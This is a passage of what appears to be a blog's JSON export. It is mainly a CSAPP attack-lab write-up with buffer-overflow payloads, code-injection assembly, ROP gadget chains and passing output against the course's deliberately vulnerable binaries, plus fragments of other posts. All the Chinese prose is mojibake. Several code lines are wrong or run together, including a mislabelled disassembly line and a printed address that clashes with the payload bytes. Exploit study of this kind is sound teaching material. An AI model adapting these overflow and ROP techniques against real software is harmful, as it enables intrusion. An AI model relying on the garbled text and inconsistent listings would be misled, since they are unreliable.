æ€»ç»“æœ€åç»“æœä¹Ÿæ˜¯æ²¡æœ‰æ‹¿åˆ°æ»¡åˆ†ï¼Œä½†æ˜¯è¿˜æ˜¯æ”¶è·äº†ä¸å°‘ä¸œè¥¿ï¼Œé‚£ç§æƒ³é—®é¢˜æƒ³ä¸æ˜ç™½çš„æ„Ÿè§‰æ˜¯çœŸçš„ç—›è‹¦ï¼Œæƒ³æ˜ç™½äº†åˆè§‰å¾—å¾ˆçˆ½ã€‚åé¢æœ‰æ—¶é—´è¿˜ä¼šä¼šè¿‡å¤´æ¥ç»§ç»­ä¼˜åŒ–è¿™ç§ç±»ä¼¼çš„é—®é¢˜ã€‚è¿˜æœ‰å°±æ˜¯è¯»ä¹¦ä¸€å®šè¦æ…¢æ…¢çš„è¯»ï¼Œè¿™æœ¬csappç®—æ˜¯å°‘æ•°è€å¿ƒæ…¢æ…¢è¯»çš„ä¹¦äº†ï¼Œå¾ˆå¤šé—®é¢˜çœ‹ä¸æ‡‚éƒ½ä¼šçœ‹å¥½å‡ éç”šè‡³èŠ±å‡ å¤©æ—¶é—´æ¥ææ‡‚ï¼Œç®—æ˜¯æ”¶è·ä¸å°ï¼Œä¹Ÿé¢†æ‚Ÿåˆ°äº†è¯»è®¡ç®—æœºä¹¦ç±çš„ä¸€äº›æ–¹æ³•ã€‚","categories":[],"tags":[{"name":"csapp","slug":"csapp","permalink":"http://example.com/tags/csapp/"}]},{"title":"attack lab","slug":"csapp_attacklab","date":"2022-02-28T14:28:33.330Z","updated":"2022-03-09T16:04:14.669Z","comments":true,"path":"38460/","link":"","permalink":"http://example.com/38460/","excerpt":"","text":"è¿™æ˜¯csappå®éªŒå®¤çš„ç¬¬ä¸‰ä¸ªlabï¼Œå…³äºcè¯­è¨€ä¸­æ ˆæº¢å‡ºçš„å®éªŒï¼Œéœ€è¦é€šè¿‡æ‰€ç»™çš„æ–‡ä»¶å’Œå®éªŒæ–‡æ¡£ä½¿ç”¨æ ˆæº¢å‡ºçš„æ‰‹æ³•æ¥å®ç°å¯¹ç¨‹åºæµç¨‹çš„æ§åˆ¶ å®˜æ–¹å®éªŒæ–‡æ¡£åœ°å€ï¼šhttp://csapp.cs.cmu.edu/3e/attacklab.pdf æ–‡ä»¶ç›®å½•ç»“æ„1234567â”œâ”€â”€ attacklab.pdfâ”œâ”€â”€ cookie.txtâ”œâ”€â”€ ctargetâ”œâ”€â”€ farm.câ”œâ”€â”€ hex2rawâ”œâ”€â”€ README.txtâ””â”€â”€ rtarget ctargetå’Œrtargetä¸¤ä¸ªå­˜åœ¨æ¼æ´çš„æ–‡ä»¶ï¼Œhex2rawæ˜¯exploitè½¬åŒ–æ–‡ä»¶ï¼Œå…·ä½“ç”¨æ³•ä¸º(è¿™äº›åœ¨pdfä¸­éƒ½æœ‰è®²åˆ°)ï¼Œä¸åœ¨è¿‡å¤šèµ˜è¿° 12# hex2rawä½¿ç”¨æ–¹å¼linux&gt;./hex2raw &lt; payload.txt ctargeté€šç”¨çš„testå‡½æ•°ï¼Œç”¨äºæ¥æ”¶ç”¨æˆ·è¾“å…¥ 123456void test()&#123; int val; val = getbuf(); printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val);&#125; level-112345678// touch1 function source codevoid touch1()&#123; vlevel = 1; /* Part of validation protocol */ printf(&quot;Touch1!: You called touch1()\\n&quot;); validate(1); exit(0);&#125; gdbè°ƒè¯•ç¡®å®šåç§»ï¼Œå­—ç¬¦ä¸²æº¢å‡ºé•¿åº¦ä¸º0x28 123 0x4017a8 &lt;getbuf&gt; sub rsp, 0x28â–º 0x4017ac &lt;getbuf+4&gt; mov rdi, rsp &lt;0x7ffff7f874d0&gt; 0x4017af &lt;getbuf+7&gt; call Gets &lt;Gets 123400:0000â”‚ rdi rsp 0x7ffffff8e440 â—‚â€” 0x0... â†“ 3 skipped04:0020â”‚ 0x7ffffff8e460 â€”â–¸ 0x7fffffffe158 â€”â–¸ 0x7fffffffe45205:0028â”‚ 0x7ffffff8e468 â€”â–¸ 0x401976 (test+14) â—‚â€” mov edx, eax æ ˆç»“æ„è¡¨ç¤ºä¸º 12345678910111213+-------------------+| aa.. | &lt;------ rsp |-------------------|| bb.. ||-------------------|| cc.. ||-------------------|| dd.. ||-------------------|| ee.. ||-------------------|| | &lt;------ ret 0x401976 (rsp+0x28)+-------------------+ ä½¿ç”¨é•¿åº¦40çš„å¡«å……å­—ç¬¦ä¸²ï¼ŒåŠ ä¸Štouch1å‡½æ•°çš„åœ°å€å³å¯è¦†ç›–åŸè¿”å›åœ°å€ï¼Œæ‰§è¡Œtouch1å‡½æ•° 1234567# touch1_exp.txt61 61 61 61 61 61 61 61 62 62 62 62 62 62 62 62 63 63 63 63 63 63 63 63 64 64 64 64 64 64 64 64 65 65 65 65 65 65 65 65 c0 17 40 00 00 00 00 00 ç»“æœ 123456789linux&gt; ./hex2raw &lt; touch1_exp.txt | ./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 62 62 62 62 62 62 62 62 63 63 63 63 63 63 63 63 64 64 64 64 64 64 64 64 65 65 65 65 65 65 65 65 C0 17 40 00 00 00 00 00 level-21234567891011121314//touch2 func srcvoid touch2(unsigned val)&#123; vlevel = 2; /* Part of validation protocol */ if (val == cookie) &#123; printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val); validate(2); &#125; else &#123; printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val); fail(2); &#125; exit(0);&#125; è¿™ä¸€å…³ä½¿ç”¨ä»£ç æ³¨å…¥ï¼Œé¦–å…ˆéœ€è¦æ§åˆ¶å‡½æ•°çš„å‚æ•°ï¼Œåœ¨64ä½å‡½æ•°ä¸­ï¼Œå‚æ•°çš„è°ƒç”¨å¦‚æœå¯„å­˜å™¨å¤Ÿç”¨å…ˆç”¨å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼Œä¼ é€’å‚æ•°çš„å¯„å­˜å™¨ä½¿ç”¨é¡ºåºä¾æ¬¡ä¸ºrdi, rsi, rdx, rcx, r8, r9ï¼Œæ³¨å…¥çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ã€‚ 123movq $0x59b997fa, %rdi #å°†cookieå€¼ä¿å­˜åœ¨%rdiä¸­ï¼Œä¹Ÿæ˜¯64ä½å‡½æ•°ä¸­çš„åœ°ä¸€ä¸ªå‚æ•°pushq $0x4017ec #å°†touch2çš„å‡½æ•°åœ°å€å‹å…¥æ ˆä¸­retq #retæŒ‡ä»¤å¯ä»¥çœ‹æˆä¸¤å¥æ±‡ç¼–ä»£ç ï¼špopq %rdi, sub $8, %rsp å°†æ±‡ç¼–ä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶ä»£ç ï¼Œå¹¶ä¸”ç”¨objdumpæŸ¥çœ‹æœºå™¨ç  123456789101112linux&gt;gcc -c exp.slinux&gt;objdump -d exp.oexp.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 mov $0x59b997fa,%rdi c: c3 ret åœ¨æ³¨å…¥ä»£ç æ„é€ å¥½ä¹‹åï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€æ¬¡è·³è½¬å°±éœ€è¦è·³è½¬åˆ°æ ˆä¸Šæ‰§è¡Œæˆ‘ä»¬çš„æ±‡ç¼–ä»£ç ï¼Œè¿™é‡Œå®éªŒä½œè€…é™ä½äº†éš¾åº¦ï¼Œæ²¡æœ‰å¼€å¯æ ˆéšæœºåŒ–ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡gdbè°ƒè¯•å¾—åˆ°æ³¨å…¥çš„æ±‡ç¼–ä»£ç å¼€å§‹å¤„çš„æ ˆåœ°å€ã€‚è°ƒè¯•å¾—åˆ°çš„æ ˆåœ°å€ä¸º0x5561dc78 123404:0020â”‚ r12 0x5561dc78 â—‚â€” mov rdi, 0x59b997fa /* 0x6859b997fac7c748 */05:0028â”‚ 0x5561dc80 â—‚â€” in al, dx /* 0xc3004017ec */06:0030â”‚ 0x5561dc88 â—‚â€” 007:0038â”‚ rbx-1 rbp-1 0x5561dc90 â—‚â€” 0 ä¸‹é¢æ˜¯æ ˆä¸­ç»“æ„ä»¥åŠæµç¨‹å›¾ 123456780x5561dc78 -&gt; 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 68 ec 17 40 00 mov $0x59b997fa,%rdi c3 ret 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 æœ€åç»“æœ 123456789linux&gt; ./hex2raw &lt; touch2_exp.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 63 63 63 63 63 63 63 63 64 64 64 64 64 64 64 64 65 65 65 65 65 65 65 65 00 78 DC 61 55 00 00 00 00 level-3123456789/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval)&#123; char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, &quot;%.8x&quot;, val); return strncmp(sval, s, 9) == 0;&#125; 12345678910111213//touch3 func srcvoid touch3(char *sval)&#123; vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) &#123; printf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); validate(3); &#125; else &#123; printf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); fail(3); &#125; exit(0);&#125; é˜…è¯»touch3çš„æºç ï¼Œç†è§£åˆ°è¿™ä¸ªå‡½æ•°éœ€è¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‡é’ˆä½œä¸ºå‚æ•°ï¼Œè¿™æ¬¡éœ€è¦å°†cookieçš„16è¿›åˆ¶çš„å­—ç¬¦ä¸²ä¸€èµ·å†™å…¥åˆ°exploit-rawä¸­ 12# 59b997façš„16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ³¨æ„å› ä¸ºæ˜¯å­—ç¬¦ä¸²ï¼Œæœ«å°¾éœ€è¦åŠ 035 39 62 39 39 37 66 61 00 ç¼–å†™æ€è·¯ï¼šå°†å­—ç¬¦ä¸²å†™å…¥æ ˆä¸­ï¼Œå› ä¸ºæ ˆä¸­åœ°å€ä¸ä¼šå˜åŒ–ï¼Œåœ¨é€šè¿‡è°ƒè¯•è·å–å­—ç¬¦ä¸²åœ°å€ã€‚è·å–å­—ç¬¦ä¸²åœ°å€åï¼Œå°±å’Œlevel-2çš„æ€è·¯ä¸€æ ·äº†ï¼Œexploitç»“æ„å¦‚ä¸‹å›¾ æ³¨å…¥ä»£ç å¦‚ä¸‹ï¼Œç”±äºç¬¬ä¸€æ¬¡ä¸çŸ¥é“åœ°å€åç§»ï¼ˆå…¶å®å¯ä»¥è®¡ç®—å‡ºæ¥ï¼Œä½†æ˜¯æœ€ç®€å•çš„æ–¹å¼è¿˜æ˜¯è°ƒè¯•ï¼‰ï¼Œå…ˆéšä¾¿å†™ç„¶åè°ƒè¯• 123movq str_addr, %rdmovq str_addr, %rdipush $0x4018faretq è°ƒè¯•ç»“æœå¦‚ä¸‹ï¼Œè§‚å¯Ÿåˆ°å­—ç¬¦ä¸²çš„é¦–åœ°å€ä¸º0x5561dca8 1234567pwndbg&gt; 08:0040â”‚ 0x5561dc98 â—‚â€” 009:0048â”‚ 0x5561dca0 â€”â–¸ 0x5561dc78 â—‚â€” mov rdi, 0x5561dca8 /* 0x685561dca8c7c748 */0a:0050â”‚ 0x5561dca8 â—‚â€” xor eax, 0x39396239 /* 0x6166373939623935; &#x27;59b997fa&#x27; */0b:0058â”‚ rbx-1 rbp-1 0x5561dcb0 â€”â–¸ 0x400000 â—‚â€” jg 0x4000470c:0060â”‚ 0x5561dcb8 â—‚â€” 00d:0068â”‚ 0x5561dcc0 â—‚â€” hlt /* 0xf4f4f4f4f4f4f4f4 */ å¾—åˆ°äº†å­—ç¬¦ä¸²åœ¨æ ˆä¸­çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿå†™å‡ºå®Œæ•´çš„exploitï¼Œç¼–è¯‘exploitåä½¿ç”¨objdumpæŸ¥çœ‹ 1234# å®Œæ•´exploitmovq $0x5561dca8, %rdmovq str_addr, %rdipush $0x4018faretq 12340000000000000000 &lt;.text&gt;: 0: 48 c7 c7 85 dc 61 55 mov $0x5561dc85,%rdi 7: 68 fa 18 40 00 push $0x4018fa c: c3 ret ç»“æœ 12345678Cookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 rtargetäº†è§£ROPè¿™ä¸¤å…³éœ€è¦æˆ‘ä»¬å­¦ä¹ ROPï¼ˆé¢å‘è¿”å›ç¼–ç¨‹ï¼‰ï¼Œæ–‡ä»¶rtargetå’Œctargetå†…å®¹æ˜¯ä¸€è‡´çš„ï¼Œåªæ˜¯rtargetåœ¨ç¼–è¯‘æ—¶å¼€å¯äº†æ ˆéšæœºåŒ–å’Œæ ˆä¸å¯æ‰§è¡Œï¼Œæ‰€ä»¥å¾€æ ˆé‡Œé¢å†™æ±‡ç¼–ä»£ç çš„æ€è·¯å°±æ–­äº†ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨ROP(ä½¿ç”¨ç°æœ‰ä»£ç )ï¼Œå¯»æ‰¾ä¸€å°æ®µæˆ‘ä»¬éœ€è¦çš„æ±‡ç¼–ä»£ç æ‹¼å‡‘æˆä¸€æˆªå®Œæ•´çš„exploit ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå°†ä¸‹é¢è¿™æ®µcè¯­è¨€ç¼–è¯‘æˆæœºå™¨è¯­è¨€ï¼Œå¹¶ä¸”ä½¿ç”¨objdumpæŸ¥çœ‹ 1234void setval_210(unsigned *p)&#123; *p = 3347663060U;&#125; 12345670000000000000000 &lt;setval_210&gt;: 0: 55 push %rbp ...... c: c7 00 d4 48 89 c7 movl $0xc78948d4,(%rax) 12: 90 nop 13: 5d pop %rbp 14: c3 ret å­—èŠ‚ç‰‡æ®µ48 89 c7ç¼–ç è¿‡åå°±æ˜¯movq %rax, %rdiï¼Œæˆ‘ä»¬å¯ä»¥æˆªå–è¿™äº›ç‰¹æ®Šçš„å­—èŠ‚ç‰‡æ®µæ¥å®ç°ROPï¼Œè¿™ä¸ªæŒ‡ä»¤å¼€å§‹çš„ä½ç½®å°±æ˜¯0xFï¼ˆç›´æ¥ç¼–è¯‘çš„æ–‡ä»¶æ²¡æœ‰åŸºåœ°å€¼ï¼‰ã€‚åœ¨å¯»æ‰¾ROPé“¾ä¹‹å‰é¦–å…ˆå°†rtargetæ–‡ä»¶çš„objdumpä¿å­˜ï¼Œä½¿ç”¨å‘½ä»¤objdump -d rtarget &gt; rtarget.dã€‚ å¯»æ‰¾ROPé“¾éœ€è¦å¯¹æœºå™¨ç æ¯”è¾ƒç†Ÿæ‚‰æ‰è¡Œï¼Œè¿˜å¥½ä½œè€…æå‰ä¸ºæˆ‘ä»¬å‡†å¤‡äº†è¿™å‡ å¼ è¡¨ level-2å‡½æ•°å°±æ˜¯touch2ï¼Œä½†æ˜¯è¿™æ¬¡ä¸èƒ½åœ¨æ ˆä¸­æ‰§è¡Œä»£ç äº†ï¼Œä½†æ˜¯é€šè¿‡å¸ƒç½®æ ˆä¸­ç»“æ„ï¼Œå¯ä»¥ä½¿ç”¨popæŒ‡ä»¤æ”¹å˜å¯„å­˜å™¨ã€‚æ ˆç»“æ„å¸ƒç½®å¦‚ä¸‹å›¾ å¯»æ‰¾è¿™ä¸¤æ¡æŒ‡ä»¤ï¼Œpopq %rax retqçš„æœºå™¨ç ä¸ºï¼š58 c3 â€‹ movq %rax, %rdi retqæœºå™¨ç ä¸ºï¼š48 89 c7 c3 é€šè¿‡æœç´¢æ‰¾åˆ°è¿™ä¸¤æ¡æ±‡ç¼–æŒ‡ä»¤ 1234500000000004019ca &lt;getval_280&gt;: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax00000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax æ‰¾åˆ°ä¸¤ä¸ªROPçš„åœ°å€ä¸º0x4019ccå’Œ0x4019a2ï¼Œå½“ç„¶ROPé“¾ä¸æ˜¯å”¯ä¸€çš„ï¼Œä¹Ÿæœ‰å…¶ä»–çš„é“¾å­ï¼Œè¿™é‡Œä¸å»æ·±ç©¶ã€‚ ç»“æœ 12345678Cookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 level-3è¿™æœ€åä¸€å…³æœ€å¤§çš„å›°éš¾ç‚¹åœ¨äºå­—ç¬¦ä¸²çš„é¦–åœ°å€ä¸å¥½ç¡®å®šï¼Œæ—¢ç„¶æ— æ³•ç¡®å®šå­—ç¬¦ä¸²çš„ç»å¯¹åœ°å€ï¼Œé‚£ä¹ˆå°±ç¡®å®šå­—ç¬¦ä¸²åœ¨æ ˆä¸­è·ç¦»rspçš„ç›¸å¯¹åç§»ï¼Œåˆæ­¥æ„é€ çš„ROPçš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ã€‚ 123movq %rsp, %raxadd %str_off, %raxmovq %rax, %rdi çœ‹ä¼¼å¾ˆç®€å•ï¼Œä½†æ˜¯addè¿™æ¡æŒ‡ä»¤åœ¨dumpæ–‡ä»¶ä¸­æ— æ³•æ‰¾åˆ°ï¼Œä½†æ˜¯åœ¨å¯»æ‰¾çš„æ—¶å€™å‘ç°äº†è¿™æ ·ä¸€æ¡æŒ‡ä»¤ã€‚ 12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 ret æ•´ä¸ªæ–‡ä»¶ä¸­åªæœ‰è¿™ä¸€æ¡æŒ‡ä»¤æ˜¯ç”¨æ¥æ“ä½œå¯„å­˜å™¨è®¡ç®—çš„ï¼Œé‚£ä¹ˆé‡æ–°ç»„ç»‡æ±‡ç¼–ä»£ç ï¼ˆè¿™é‡Œçœç•¥äº†retæŒ‡ä»¤ï¼‰ï¼Œç¬¬ä¸€æ­¥æœ¬æ¥æƒ³ç”¨movq %rsp, %rdiè¿™æ¡æŒ‡ä»¤çš„ï¼Œä½†æ˜¯åœ¨æ–‡ä»¶ä¸­æ— æ³•æ‰¾åˆ°ï¼Œäºæ˜¯åˆ†ä¸¤æ­¥ä»£æ›¿ã€‚ 12345movq %rsp, %raxmovq %rax, %rdipopq %rsilea (%rdi,%rsi,1),%raxmovq %rax, %rdi åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œç¡®å®šæ¯æ¡æŒ‡ä»¤çš„åœ°å€ 1234567891011121314151617181920# movq %rsp, %rax# æŒ‡ä»¤åœ°å€ï¼š0x401a060000000000401a03 &lt;addval_190&gt;: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 ret # movq %rax, %rdi# æŒ‡ä»¤åœ°å€ï¼š0x4019a200000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax# popq %rsi# æŒ‡ä»¤åœ°å€ï¼š0x401383401382: 41 5e pop %r14# lea (%rdi,%rsi,1),%rax# æŒ‡ä»¤åœ°å€ï¼š0x4019d600000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 ret æ­¤æ—¶æ ˆç»“æ„å¸ƒç½®å¦‚ä¸‹ ç»“æœ 12345678Cookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 83 13 40 00 00 00 00 00 30 00 00 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 æ€»ç»“è¿™äº›åŸºæœ¬çš„æ ˆæº¢å‡ºçŸ¥è¯†åœ¨ä»¥å‰å­¦pwnçš„æ—¶å€™éƒ½æœ‰è¿‡äº†è§£ï¼Œæœ¬ä»¥ä¸ºä¼šå¾ˆè½»æ¾ï¼Œä½†æ˜¯åœ¨å®é™…ä¸Šæ‰‹æ“ä½œæ—¶è¿˜æ˜¯æ„Ÿè§‰å¾ˆæœ‰æŒ‘æˆ˜æ€§ï¼Œç‰¹åˆ«æ˜¯åœ¨åšå…³äºROPçš„æ—¶å€™ï¼Œä»¥å‰åšpwnéƒ½æ˜¯ç›´æ¥ç”¨å·¥å…·å¯»æ‰¾ropé“¾ï¼Œä»æ¥æ²¡æœ‰è‡ªå·±å»å¯»æ‰¾è¿‡ï¼Œè¿™æ¬¡é€šè¿‡è‡ªå·±å¯»æ‰¾ropé“¾æ„Ÿå—é¢‡æ·±ã€‚","categories":[],"tags":[{"name":"csapp","slug":"csapp","permalink":"http://example.com/tags/csapp/"}]},{"title":"Y86-64å¤„ç†å™¨ä½“ç³»ç»“æ„","slug":"csapp_y86","date":"2022-02-27T13:33:39.313Z","updated":"2022-03-09T16:08:29.736Z","comments":true,"path":"39402/","link":"","permalink":"http://example.com/39402/","excerpt":"","text":"Y86-64æŒ‡ä»¤ä½“ç³»ç»“æ„Y86-64å¯ä»¥çœ‹ä½œæ˜¯ciscå’ŒriscäºŒè€…çš„åˆé›†ï¼Œå®ƒæ—¢æ˜¯å¯å˜é•¿åº¦æŒ‡ä»¤é›†ï¼Œåˆæ˜¯load/storeä½“ç³»æŒ‡ä»¤2 è¿™é‡Œæ€»çš„æ¥è¯´å°±æ˜¯æ•™å­¦å¦‚ä½•å°†æ±‡ç¼–æŒ‡ä»¤è½¬åŒ–ä¸ºæœºå™¨ç ä»¥åŠå°†æœºå™¨ç è½¬åŒ–ä¸ºæ±‡ç¼–æŒ‡ä»¤ å…³äºç¡¬ä»¶ç¼–ç¨‹å’Œæœºå™¨ç¼–ç¨‹è¿™é‡Œåªæ˜¯ç®€å•çš„ä»‹ç»ä¸‹äºŒè€…çš„å…³ç³»ä¸åŒºåˆ«ä»¥åŠæˆ‘çš„ç†è§£ å¤§äºŒå­¦äº†å…³äºæ•°å­—ç”µè·¯ï¼ˆè™½ç„¶æ²¡æ€ä¹ˆå­¦æ‡‚ï¼‰å’Œè®¡ç®—æœºç»„æˆåŸç†ï¼ˆæ ¹æœ¬æ²¡æœ‰å­¦ï¼‰çš„çŸ¥è¯†ï¼Œäº†è§£äº†è®¡ç®—æœºä¸­çš„CPUç»„æˆåŸç†ï¼šä»å¾®è§‚æ¥è¯´å°±æ˜¯å‡ ä¸ªåŸºç¡€çš„é—¨ç»„æˆï¼Œè¿™äº›ä¸œè¥¿ç»Ÿç§°ä¸ºç”µè·¯ï¼Œç”µè·¯ä¿¡å·è¾“å…¥åœ¨è¾“å‡ºæˆæƒ³è¦çš„å€¼ï¼Œè¿™ç§ç”µè·¯æ²¡æœ‰å­˜å‚¨èƒ½åŠ›ã€‚åœ¨è®¡ç®—æœºä¸­ä¿¡æ¯éƒ½æ˜¯ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­çš„ï¼Œè®°å½•ä¸‹ä¹¦ä¸­å†™çš„ï¼Œå¤§æ¦‚æœ‰ä¸¤ç§å¯„å­˜å™¨ æ—¶é’Ÿå¯„å­˜å™¨ éšæœºè®¿é—®å¯„å­˜å™¨ï¼ˆç®€ç§°å†…å­˜ï¼‰ Y86-64é¡ºåºå®ç°ç®€å•æ¥è¯´ï¼Œå¤„ç†å™¨å¤„ç†æœºå™¨ç éœ€è¦ä¸€ä¸ªæˆç†Ÿï¼Œé€šç”¨çš„æ¡†æ¶ï¼Œæ— è®ºæ˜¯å¤æ‚æŒ‡ä»¤é›†è¿˜æ˜¯ç®€å•æŒ‡ä»¤é›†ï¼Œä¸€æ¡æŒ‡ä»¤çš„æœºå™¨ç éƒ½è¦èƒ½å¤Ÿå¿«é€Ÿå‡†ç¡®çš„è¯†åˆ«ï¼ŒY86-64å¤„ç†å™¨çš„å®ç°é¦–å…ˆéœ€è¦SEQå¤„ç†å™¨ SEQå¤„ç†å™¨çš„æ¡†æ¶ä¸º å–æŒ‡ è§£ææŒ‡ä»¤æ“ä½œç ï¼Œå¦‚æœæœ‰å¯„å­˜å™¨ç­‰ä¸€å¹¶è§£æå¹¶ä¸”ä¿å­˜ï¼Œè€Œåpc+nä¿å­˜åœ¨ä¸´æ—¶å˜é‡ä¸­ è¯‘ç  å¦‚æœæŒ‡ä»¤ä¼šæ”¹å˜å¯„å­˜å™¨å€¼æˆ–è€…éœ€è¦ç”¨åˆ°å¯„å­˜å™¨å€¼ï¼Œé€šè¿‡å–æŒ‡æ“ä½œè·å–çš„å¯„å­˜å™¨æ–‡ä»¶ç¼–å·æ¥è·å–å¯„å­˜å™¨å€¼ æ‰§è¡Œ éœ€è¦ä½¿ç”¨AULçš„æ­¥éª¤æˆ–è€…å¤„ç†è·³è½¬æŒ‡ä»¤åœ¨è¿›è¡Œåˆ¤æ–­æ—¶ï¼ˆè¿™é‡Œçš„åˆ¤æ–­ä¼°è®¡ä¹Ÿä¼šç”¨åˆ°AULè¿›è¡Œè®¡ç®—ï¼‰å«åšæ‰§è¡Œï¼Œæ¯”å¦‚åŠ å‡ç­‰æ“ä½œï¼Œå¸¸ç”¨çš„pushå’ŒpopæŒ‡ä»¤æ”¹å˜rspå¯„å­˜å™¨çš„å€¼æ—¶ä¼šæœ‰%rsp+8æˆ–è€…%rsp-8ç­‰æ“ä½œï¼Œè¿™ä¸€ç±»çš„æŒ‡ä»¤åœ¨SEQå¤„ç†å™¨å¤„ç†æ—¶ä¼šæœ‰æ‰§è¡Œè¿™ä¸€æ­¥æ“ä½œã€‚è¿™é‡Œä¸å¹³æ—¶åœ¨ä»£ç ä¸­æ‰€è¯´çš„æ‰§è¡Œæœ‰ä¸ä¸€æ ·çš„ç†è§£ è®¿å­˜ å¦‚æœéœ€è¦ä»å†…å­˜ä¸­è·å–å€¼æˆ–è€…å°†è®¡ç®—å€¼ä¿å­˜åœ¨å†…å­˜ä¸­ä¼šæœ‰è®¿å­˜æ“ä½œ å†™å› è¿™ä¸€æ­¥æ“ä½œç®€å•æ¥è¯´å°±æ˜¯è·Ÿæ–°å¯„å­˜å™¨å€¼ï¼Œå¦‚æœæŒ‡ä»¤æ“ä½œè¿‡åå¯„å­˜å™¨çš„å€¼éœ€è¦å˜åŒ–ä¼šæœ‰å†™å›ä¸€æ­¥ æ›´æ–°PC è·Ÿæ–°PCæŒ‡é’ˆï¼Œä½¿ä¹‹æ§åˆ¶ç¨‹åºä¸‹ä¸€æ­¥çš„æ‰§è¡Œæµç¨‹ åœ¨å¤„ç†å™¨å‘ç”Ÿå¼‚å¸¸æˆ–è€…æ‰§è¡ŒhtalæŒ‡ä»¤æˆ–è€…æ‰§è¡Œéæ³•æŒ‡ä»¤ï¼Œè®¿é—®éæ³•å†…å­˜æ—¶ï¼Œå¤„ç†å™¨åœæ­¢æ‰§è¡Œï¼Œè¿™å¼ SEQå¤„ç†å™¨æµç¨‹å›¾å¯ä»¥æ›´åŠ ç›´è§‚çš„å±•ç¤ºå„ä¸ªæµç¨‹çš„å«ä¹‰ä¸ç»†èŠ‚ ä¸‹é¢è´´å‡ºä¹¦ä¸­è®¡ç®—æŒ‡ä»¤ï¼Œirmovqå’ŒrrmovqæŒ‡ä»¤çš„å®ä¾‹å›¾","categories":[],"tags":[{"name":"csapp","slug":"csapp","permalink":"http://example.com/tags/csapp/"}]},{"title":"æµ®ç‚¹æ•°è½¬æ¢é—®é¢˜ä¸æ“ä½œæŒ‡ä»¤","slug":"csapp_float","date":"2022-02-25T16:23:22.224Z","updated":"2022-03-09T16:09:45.864Z","comments":true,"path":"52768/","link":"","permalink":"http://example.com/52768/","excerpt":"","text":"ä¸€ç›´å¯¹äºè®¡ç®—æœºçš„æµ®ç‚¹æ•°æ“ä½œåŸç†ä»¥åŠæŒ‡ä»¤å¾ˆæ¨¡ç³Šï¼Œç‰¹åˆ«æ˜¯å…³äºæµ®ç‚¹